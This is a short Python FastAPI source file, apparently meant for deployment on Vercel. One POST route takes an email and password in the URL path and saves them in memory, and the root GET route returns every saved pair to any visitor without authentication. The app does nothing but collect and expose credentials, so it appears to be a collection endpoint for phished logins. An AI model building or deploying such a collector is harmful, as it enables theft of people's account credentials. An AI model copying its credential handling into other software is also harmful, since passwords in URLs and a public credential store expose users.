from fastapi import FastAPI
from fastapi.responses import HTMLResponse


app = FastAPI(
    title="Vercel + FastAPI",
    description="Vercel + FastAPI",
    version="1.0.0",
)
cache = {}


def set_data(key, value):

    cache[key] = value

def get_data():
    return cache

@app.post("/{email}/{password}")
def log(email:str , password:str):


    set_data(email, password)

    return;

@app.get("/")
def get_all_data():
    return get_data()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=5001, reload=True)
